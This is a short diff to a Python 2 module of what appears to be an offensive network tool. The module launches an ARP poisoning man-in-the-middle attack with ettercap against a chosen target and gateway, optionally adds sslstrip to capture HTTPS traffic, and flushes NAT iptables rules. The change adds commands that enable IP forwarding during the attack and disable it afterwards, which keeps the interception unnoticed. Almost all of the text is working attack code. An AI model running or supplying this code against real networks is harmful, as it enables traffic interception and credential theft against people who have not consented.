@@ -44,6 +44,7 @@ def main(run):
 	if isConect() and checkDevice(init.var['interface']):
 		printAlert(0,"Starting ARP Poisoning [ettercap].")
 		commands.getoutput("iptables --flush -t nat")
+		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
 		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
 		if init.var['https']:
 			printAlert(0,"Starting SSL Capturing [sslstrip].")
@@ -54,6 +55,7 @@ def main(run):
 		raw_input(printAlert(8,"to Stop ARP Attack (PRESS ANY KEY)\n"))
 		commands.getoutput("killall ettercap")
 		commands.getoutput("killall sslstrip")
+		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		commands.getoutput("iptables --flush -t nat")
 
 # END CODE MODULE ############################################################################################
